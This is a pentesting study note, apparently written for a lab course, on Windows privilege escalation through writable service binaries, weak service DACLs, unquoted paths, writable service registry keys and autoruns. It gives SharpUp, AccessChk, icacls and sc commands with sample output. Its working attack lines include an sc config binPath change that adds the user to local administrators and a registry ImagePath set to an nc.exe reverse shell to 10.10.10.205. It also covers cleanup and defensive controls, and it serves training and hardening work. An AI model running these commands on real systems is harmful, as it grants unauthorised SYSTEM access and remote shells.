@@ -1,0 +1,1275 @@
+---
+title: Windows Privilege Escalation – Weak Service and Registry Permissions
+aliases:
+  - Weak Service Permissions
+  - Permissive Service ACLs
+  - Modifiable Service Binaries
+  - Unquoted Service Paths
+  - Permissive Registry ACLs
+  - Autorun Binary Abuse
+tags:
+  - windows
+  - privilege-escalation
+  - windows-services
+  - service-permissions
+  - weak-acls
+  - icacls
+  - accesschk
+  - sharpup
+  - unquoted-service-path
+  - registry-acls
+  - autoruns
+  - pentesting
+---
+## Overview
+
+Windows permissions are complex and easy to misconfigure. A small permission change in one location can unintentionally introduce a privilege escalation path somewhere else.
+
+Weak permissions are especially dangerous around Windows services because services often run as:
+
+```text
+NT AUTHORITY\SYSTEM
+```
+
+If an unprivileged user can modify a service binary, service configuration, service registry key, or startup binary, they may be able to execute commands in a privileged context.
+
+> [!important]
+> Always check for weak service and registry permissions during Windows privilege escalation. Be able to do this with tools and manually.
+
+---
+
+# Common Permission-Based Escalation Paths
+
+This note covers:
+
+- permissive file system ACLs on service binaries
+- weak service permissions
+- unquoted service paths
+- permissive service registry ACLs
+- modifiable autorun binaries
+
+These issues are less common in mature software from large vendors but are often found in:
+
+- third-party software from smaller vendors
+- open-source Windows applications
+- custom internal applications
+- poorly packaged enterprise tools
+- legacy services
+
+---
+
+# Method 1 – Permissive File System ACLs on Service Binaries
+
+## Attack Concept
+
+If a service runs as SYSTEM and its executable is writable by low-privileged users, the binary can be replaced with a malicious executable.
+
+When the service starts, the malicious replacement executes with the service account’s privileges.
+
+Typical result:
+
+```text
+Unprivileged user → replace writable service binary → service starts as SYSTEM → SYSTEM execution
+```
+
+---
+
+# Step 1 – Find Weak Service Binary ACLs with SharpUp
+
+Use `SharpUp` to audit common privilege escalation checks.
+
+```powershell
+.\SharpUp.exe audit
+```
+
+Example output:
+
+```powershell
+PS C:\htb> .\SharpUp.exe audit
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+
+=== Modifiable Service Binaries ===
+
+  Name             : SecurityService
+  DisplayName      : PC Security Management Service
+  Description      : Responsible for managing PC security
+  State            : Stopped
+  StartMode        : Auto
+  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+
+  <SNIP>
+```
+
+The important finding is:
+
+```text
+Modifiable Service Binaries
+```
+
+Target service:
+
+```text
+SecurityService
+```
+
+Target binary:
+
+```text
+C:\Program Files (x86)\PCProtect\SecurityService.exe
+```
+
+---
+
+# Step 2 – Verify Permissions with icacls
+
+Check the service binary permissions manually.
+
+```powershell
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+Example output:
+
+```powershell
+PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+
+C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
+                                                     Everyone:(I)(F)
+                                                     NT AUTHORITY\SYSTEM:(I)(F)
+                                                     BUILTIN\Administrators:(I)(F)
+                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+Dangerous entries:
+
+```text
+BUILTIN\Users:(I)(F)
+Everyone:(I)(F)
+```
+
+Meaning:
+
+| Entry | Meaning |
+|---|---|
+| `BUILTIN\Users` | All local users |
+| `Everyone` | Broad access group |
+| `(I)` | Inherited permission |
+| `(F)` | Full control |
+
+Any unprivileged user can manipulate the binary.
+
+---
+
+# Step 3 – Replace the Service Binary
+
+Back up the original binary first when possible.
+
+Then replace the writable service binary with a malicious executable.
+
+Example replacement command:
+
+```cmd
+cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+Start the service:
+
+```cmd
+sc start SecurityService
+```
+
+## Payload Options
+
+The replacement executable could:
+
+- return a reverse shell as SYSTEM
+- add a local administrator user
+- run a one-time command
+- write proof-of-execution output
+- perform another authorized payload action
+
+> [!warning]
+> Replacing service binaries is destructive. Always back up the original binary and restore it during cleanup.
+
+---
+
+# Method 2 – Weak Service Permissions
+
+## Attack Concept
+
+If a low-privileged user has write access or `SERVICE_ALL_ACCESS` over a service, they can modify the service configuration.
+
+A common escalation technique is to change the service binary path to a command.
+
+Example:
+
+```cmd
+cmd /c net localgroup administrators htb-student /add
+```
+
+When the service starts, the command runs in the service context.
+
+If the service runs as SYSTEM, this can grant local admin access or SYSTEM command execution.
+
+---
+
+# Step 1 – Find Modifiable Services with SharpUp
+
+Run SharpUp again and look for modifiable services.
+
+```cmd
+SharpUp.exe audit
+```
+
+Example output:
+
+```cmd
+C:\htb> SharpUp.exe audit
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+
+=== Modifiable Services ===
+
+  Name             : WindscribeService
+  DisplayName      : WindscribeService
+  Description      : Manages the firewall and controls the VPN tunnel
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
+```
+
+Target service:
+
+```text
+WindscribeService
+```
+
+Original service binary:
+
+```text
+C:\Program Files (x86)\Windscribe\WindscribeService.exe
+```
+
+---
+
+# Step 2 – Check Service Permissions with AccessChk
+
+Use Sysinternals `AccessChk` to enumerate service permissions.
+
+```cmd
+accesschk.exe /accepteula -quvcw WindscribeService
+```
+
+Example output:
+
+```cmd
+C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
+
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+WindscribeService
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+```
+
+Dangerous entry:
+
+```text
+RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+```
+
+This means all authenticated users have full read/write control over the service.
+
+## AccessChk Flag Breakdown
+
+| Flag | Purpose |
+|---|---|
+| `/accepteula` | Accept Sysinternals EULA |
+| `-q` | Omit banner |
+| `-u` | Suppress errors |
+| `-v` | Verbose output |
+| `-c` | Specify a Windows service |
+| `-w` | Show only objects with write access |
+
+---
+
+# Step 3 – Check Local Administrators Group
+
+Confirm the current user is not already a local administrator.
+
+```cmd
+net localgroup administrators
+```
+
+Example output:
+
+```cmd
+C:\htb> net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+mrb3n
+The command completed successfully.
+```
+
+The user `htb-student` is not currently a local administrator.
+
+---
+
+# Step 4 – Change the Service Binary Path
+
+Modify the service `binpath` to add the current user to local administrators.
+
+```cmd
+sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+```
+
+Example output:
+
+```cmd
+C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+
+[SC] ChangeServiceConfig SUCCESS
+```
+
+> [!tip]
+> `sc.exe` syntax is picky. Many versions expect a space after the equals sign, for example:
+>
+> ```cmd
+> sc config WindscribeService binPath= "cmd /c net localgroup administrators htb-student /add"
+> ```
+
+---
+
+# Step 5 – Stop the Service
+
+Stop the service so the modified binary path runs the next time it starts.
+
+```cmd
+sc stop WindscribeService
+```
+
+Example output:
+
+```cmd
+C:\htb> sc stop WindscribeService
+
+SERVICE_NAME: WindscribeService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x4
+        WAIT_HINT          : 0x0
+```
+
+---
+
+# Step 6 – Start the Service
+
+Start the service.
+
+```cmd
+sc start WindscribeService
+```
+
+Example output:
+
+```cmd
+C:\htb> sc start WindscribeService
+
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+```
+
+This failure is expected.
+
+The service fails because the binary path now points to a short-lived command instead of a proper service executable.
+
+The important part is that Windows still attempts to execute the configured command before the service fails.
+
+---
+
+# Step 7 – Confirm Local Administrator Addition
+
+Check the local administrators group again.
+
+```cmd
+net localgroup administrators
+```
+
+Example output:
+
+```cmd
+C:\htb> net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+htb-student
+mrb3n
+The command completed successfully.
+```
+
+The user `htb-student` is now a local administrator.
+
+---
+
+# Weak Service Permissions – Real-World Example
+
+## UsoSvc
+
+The Windows Update Orchestrator Service is:
+
+```text
+UsoSvc
+```
+
+It is responsible for downloading and installing operating system updates.
+
+Because it modifies the operating system, it runs as:
+
+```text
+NT AUTHORITY\SYSTEM
+```
+
+Before the security patch for:
+
+```text
+CVE-2019-1322
+```
+
+weak permissions allowed service accounts to modify the service binary path and start or stop the service, resulting in privilege escalation to SYSTEM.
+
+---
+
+# Weak Service Permissions – Cleanup
+
+## Step 1 – Restore Original Binary Path
+
+Reset the binary path to the original service executable.
+
+```cmd
+sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
+```
+
+Example output:
+
+```cmd
+C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
+
+[SC] ChangeServiceConfig SUCCESS
+```
+
+> [!note]
+> Service name casing may vary in examples: `WindscribeService` vs `WindScribeService`. Use the exact service name from `sc query` or SharpUp output.
+
+---
+
+## Step 2 – Start Service Again
+
+```cmd
+sc start WindScribeService
+```
+
+Example output:
+
+```cmd
+C:\htb> sc start WindScribeService
+
+SERVICE_NAME: WindScribeService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 1716
+        FLAGS              :
+```
+
+---
+
+## Step 3 – Verify Service Is Running
+
+```cmd
+sc query WindScribeService
+```
+
+Example output:
+
+```cmd
+C:\htb> sc query WindScribeService
+
+SERVICE_NAME: WindScribeService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  Running
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+---
+
+# Method 3 – Unquoted Service Path
+
+## Attack Concept
+
+When a service binary path contains spaces and is not wrapped in quotes, Windows may interpret the path incorrectly.
+
+Example unquoted service path:
+
+```text
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+```
+
+Windows tries to resolve executable paths in stages. Since `.exe` is implied, Windows may attempt to load:
+
+```text
+C:\Program.exe
+C:\Program Files.exe
+C:\Program Files (x86)\System.exe
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+```
+
+If an attacker can place a malicious executable in one of the earlier paths, it may execute before the legitimate service binary.
+
+---
+
+# Step 1 – Query the Service
+
+```cmd
+sc qc SystemExplorerHelpService
+```
+
+Example output:
+
+```cmd
+C:\htb> sc qc SystemExplorerHelpService
+
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Explorer Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+
+Important fields:
+
+```text
+START_TYPE         : 2   AUTO_START
+BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+SERVICE_START_NAME : LocalSystem
+```
+
+The service starts automatically and runs as SYSTEM.
+
+---
+
+# Step 2 – Identify Hijack Locations
+
+For this path:
+
+```text
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+```
+
+Possible hijack locations include:
+
+```text
+C:\Program.exe
+C:\Program Files (x86)\System.exe
+```
+
+If a low-privileged user can create either file, the service may execute the malicious binary.
+
+---
+
+# Exploitability Caveats
+
+Unquoted service paths are common, but they are often not exploitable.
+
+Reasons:
+
+- creating files in `C:\` usually requires admin rights
+- creating files in `C:\Program Files` usually requires admin rights
+- the user may not be able to restart the service
+- exploitation may require waiting for a reboot
+- endpoint protection may block suspicious binaries
+- the vulnerable path must contain writable intermediate directories
+
+> [!important]
+> Do not treat every unquoted service path as exploitable. Confirm write access to the hijack location and the ability to trigger service start.
+
+---
+
+# Step 3 – Search for Unquoted Service Paths
+
+Use WMIC to identify auto-start services with unquoted paths outside `C:\Windows`.
+
+```cmd
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+
+Example output:
+
+```cmd
+C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
+System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
+WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
+```
+
+Review each result for:
+
+- unquoted path
+- spaces in path
+- auto-start service
+- writable directory before the legitimate executable
+- service account context
+- ability to restart service or force reboot
+
+---
+
+# Method 4 – Permissive Registry ACLs on Services
+
+## Attack Concept
+
+Service configuration is stored in the Windows Registry under:
+
+```text
+HKLM\System\CurrentControlSet\Services
+```
+
+If a user can modify a service registry key, they may be able to change the service `ImagePath`.
+
+This can redirect service execution to a payload or command.
+
+---
+
+# Step 1 – Check for Weak Service Registry ACLs
+
+Use `AccessChk`.
+
+```cmd
+accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
+```
+
+Example output:
+
+```cmd
+C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
+
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+RW HKLM\System\CurrentControlSet\services\ModelManagerService
+        KEY_ALL_ACCESS
+
+<SNIP>
+```
+
+Dangerous finding:
+
+```text
+RW HKLM\System\CurrentControlSet\services\ModelManagerService
+        KEY_ALL_ACCESS
+```
+
+This means the user can modify the service registry key.
+
+---
+
+# Step 2 – Change ImagePath with PowerShell
+
+Modify the service `ImagePath`.
+
+Example payload path:
+
+```powershell
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+```
+
+This changes the service executable to run a payload.
+
+> [!warning]
+> Changing `ImagePath` can break services. Record the original value before modifying it.
+
+---
+
+# Method 5 – Modifiable Registry Autorun Binary
+
+## Attack Concept
+
+Windows autorun locations define programs that execute at system startup or user logon.
+
+If a low-privileged user can modify an autorun registry value or overwrite a referenced binary, they may be able to execute code the next time a target user logs in or the system starts.
+
+Potential impact depends on the autorun context:
+
+| Autorun Location | Execution Context |
+|---|---|
+| `HKCU\...\Run` | Current user logon |
+| `HKLM\...\Run` | All users / system-wide logon context |
+| Startup folder | User or all-users startup |
+| Service autorun | Service account context |
+
+---
+
+# Step 1 – Enumerate Startup Programs
+
+Use CIM to list startup commands.
+
+```powershell
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+```
+
+Example output:
+
+```powershell
+PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+
+Name     : OneDrive
+command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : WINLPE-WS01\mrb3n
+
+Name     : Windscribe
+command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
+Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : WINLPE-WS01\mrb3n
+
+Name     : SecurityHealth
+command  : %windir%\system32\SecurityHealthSystray.exe
+Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : Public
+
+Name     : VMware User Process
+command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : Public
+
+Name     : VMware VM3DService Process
+command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
+Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : Public
+```
+
+---
+
+# Step 2 – Assess Autorun Abuse Potential
+
+For each startup command, check:
+
+- who owns the registry value
+- who can modify the registry value
+- who can overwrite the referenced binary
+- whether the target user is privileged
+- when the autorun triggers
+- whether the path is quoted
+- whether the binary directory is writable
+
+Possible abuse paths:
+
+```text
+Writable autorun registry value → change command → payload runs on logon
+```
+
+```text
+Writable autorun binary → replace binary → payload runs on logon
+```
+
+---
+
+# Practical Decision Tree
+
+## Are there writable service binaries?
+
+Find with:
+
+```powershell
+.\SharpUp.exe audit
+```
+
+Verify with:
+
+```powershell
+icacls "<service_binary_path>"
+```
+
+If low-privileged users have write or full control, replace the binary and restart the service.
+
+---
+
+## Are there weak service permissions?
+
+Find with:
+
+```cmd
+SharpUp.exe audit
+```
+
+Verify with:
+
+```cmd
+accesschk.exe /accepteula -quvcw <service_name>
+```
+
+If low-privileged users have `SERVICE_ALL_ACCESS`, modify `binPath`.
+
+---
+
+## Does the service run as SYSTEM?
+
+Check:
+
+```cmd
+sc qc <service_name>
+```
+
+Look for:
+
+```text
+SERVICE_START_NAME : LocalSystem
+```
+
+---
+
+## Can the service be restarted?
+
+Check whether the current user can stop/start the service.
+
+```cmd
+sc stop <service_name>
+sc start <service_name>
+```
+
+If not, exploitation may require waiting for reboot or another service restart event.
+
+---
+
+## Are there unquoted service paths?
+
+Search:
+
+```cmd
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+
+Then confirm write access to the candidate hijack path.
+
+---
+
+## Are service registry keys writable?
+
+Check:
+
+```cmd
+accesschk.exe /accepteula "<user>" -kvuqsw hklm\System\CurrentControlSet\services
+```
+
+If writable, inspect and modify `ImagePath` only with authorization.
+
+---
+
+## Are autorun entries modifiable?
+
+Enumerate:
+
+```powershell
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+```
+
+Then check registry and file permissions.
+
+---
+
+# Troubleshooting
+
+## SharpUp finds a service but exploitation fails
+
+Possible causes:
+
+- service is not startable by the current user
+- service does not run as SYSTEM
+- writable path is not the actual executable
+- endpoint protection blocks the payload
+- replacement binary is invalid
+- service requires specific arguments
+- 32-bit vs 64-bit payload mismatch
+
+---
+
+## `icacls` shows inherited full control
+
+Inherited full control is still dangerous.
+
+Example:
+
+```text
+BUILTIN\Users:(I)(F)
+Everyone:(I)(F)
+```
+
+This means the permission is inherited from a parent directory and applies to the target file.
+
+---
+
+## `sc start` returns error 1053
+
+This is expected when the service `binPath` points to a short-lived command.
+
+Check whether the command executed:
+
+```cmd
+net localgroup administrators
+```
+
+---
+
+## `sc config` command fails
+
+Check:
+
+- syntax
+- service name
+- permissions
+- elevation
+- spacing after `binPath=`
+
+Safer syntax:
+
+```cmd
+sc config <service_name> binPath= "cmd /c <command>"
+```
+
+---
+
+## Unquoted service path is not exploitable
+
+Common reasons:
+
+- cannot write to `C:\`
+- cannot write to `C:\Program Files`
+- cannot restart service
+- endpoint controls block payload
+- service runs as a low-privileged account
+- no writable intermediate path exists
+
+---
+
+## Registry ImagePath abuse fails
+
+Possible causes:
+
+- wrong registry path
+- insufficient permissions
+- service not restarted
+- ImagePath overwritten incorrectly
+- payload path invalid
+- service control permissions missing
+
+---
+
+# Command Reference
+
+## Run SharpUp audit
+
+```powershell
+.\SharpUp.exe audit
+```
+
+## Check service binary ACL
+
+```powershell
+icacls "<service_binary_path>"
+```
+
+## Replace service binary
+
+```cmd
+cmd /c copy /Y <payload.exe> "<service_binary_path>"
+```
+
+## Start service
+
+```cmd
+sc start <service_name>
+```
+
+## Check service permissions with AccessChk
+
+```cmd
+accesschk.exe /accepteula -quvcw <service_name>
+```
+
+## Check local administrators group
+
+```cmd
+net localgroup administrators
+```
+
+## Change service binary path
+
+```cmd
+sc config <service_name> binPath= "cmd /c net localgroup administrators <user> /add"
+```
+
+## Stop service
+
+```cmd
+sc stop <service_name>
+```
+
+## Query service
+
+```cmd
+sc query <service_name>
+```
+
+## Query service configuration
+
+```cmd
+sc qc <service_name>
+```
+
+## Restore Windscribe service binary path
+
+```cmd
+sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
+```
+
+## Search for unquoted service paths
+
+```cmd
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+
+## Check weak registry ACLs under services
+
+```cmd
+accesschk.exe /accepteula "<user>" -kvuqsw hklm\System\CurrentControlSet\services
+```
+
+## Modify service ImagePath in registry
+
+```powershell
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<service_name> -Name "ImagePath" -Value "<payload_or_command>"
+```
+
+## Enumerate startup commands
+
+```powershell
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+```
+
+---
+
+# Cleanup Checklist
+
+## Service binary replacement cleanup
+
+Restore the original binary:
+
+```cmd
+cmd /c copy /Y <original_binary_backup> "<service_binary_path>"
+```
+
+Restart or query the service:
+
+```cmd
+sc start <service_name>
+sc query <service_name>
+```
+
+---
+
+## Service binPath cleanup
+
+Restore the original binary path:
+
+```cmd
+sc config <service_name> binPath= "<original_binary_path>"
+```
+
+Confirm:
+
+```cmd
+sc qc <service_name>
+```
+
+Start service:
+
+```cmd
+sc start <service_name>
+```
+
+Confirm running state:
+
+```cmd
+sc query <service_name>
+```
+
+---
+
+## Local admin group cleanup
+
+Remove the added user if appropriate:
+
+```cmd
+net localgroup administrators <user> /delete
+```
+
+---
+
+## Registry cleanup
+
+Restore the original `ImagePath` value.
+
+```powershell
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<service_name> -Name "ImagePath" -Value "<original_imagepath>"
+```
+
+---
+
+## Autorun cleanup
+
+Restore original autorun registry values or binaries.
+
+Document:
+
+- original value
+- modified value
+- payload path
+- trigger condition
+- whether the target user logged in
+- cleanup status
+
+---
+
+# Defensive Notes
+
+## Common Weak Points
+
+Review permissions on:
+
+- service executable files
+- service executable directories
+- service security descriptors
+- service registry keys
+- autorun registry locations
+- autorun binary paths
+- software installed under `Program Files`
+- third-party vendor services
+- custom enterprise services
+
+---
+
+## Defensive Controls
+
+Consider:
+
+- least privilege on service directories
+- deny write access to service binaries for standard users
+- monitor service configuration changes
+- monitor `sc config` usage
+- monitor service `ImagePath` changes
+- alert on suspicious service start failures
+- detect writable service binaries
+- detect weak service DACLs
+- quote all service paths
+- restrict service restart permissions
+- review autorun locations
+- patch known service permission vulnerabilities such as `CVE-2019-1322`
+- use application control where possible
+
+---
+
+# Key Takeaways
+
+- Service permission flaws can often lead to SYSTEM execution.
+- Writable service binaries are high-impact when the service runs as SYSTEM.
+- `SharpUp` can identify modifiable service binaries and services.
+- `icacls` can confirm weak file ACLs.
+- `AccessChk` can confirm weak service permissions and registry ACLs.
+- `SERVICE_ALL_ACCESS` for low-privileged users is dangerous.
+- Changing a service `binPath` to `cmd /c <command>` can execute commands when the service starts.
+- Error `1053` can still mean the command executed.
+- Unquoted service paths are common but not always exploitable.
+- Writable service registry keys can allow `ImagePath` hijacking.
+- Modifiable autorun entries or binaries may enable execution on user logon or system startup.
+- Always restore modified services, binaries, registry values, and group memberships.
+
+---
+
+# Related Notes
+
+- [[Windows Privilege Escalation]]
+- [[Windows Services]]
+- [[Service Permissions]]
+- [[Access Control Lists]]
+- [[icacls]]
+- [[SharpUp]]
+- [[AccessChk]]
+- [[Unquoted Service Paths]]
+- [[Registry ACLs]]
+- [[Autoruns]]
+- [[SeImpersonatePrivilege]]
+- [[SeBackupPrivilege]]
+- [[CVE-2019-1322]]
+
+---
+
+# Tags
+
+#windows
+#privilege-escalation
+#windows-services
+#weak-acls
+#service-permissions
+#modifiable-service-binary
+#unquoted-service-path
+#registry-acls
+#autoruns
+#sharpup
+#accesschk
+#icacls
+#system
+#pentesting
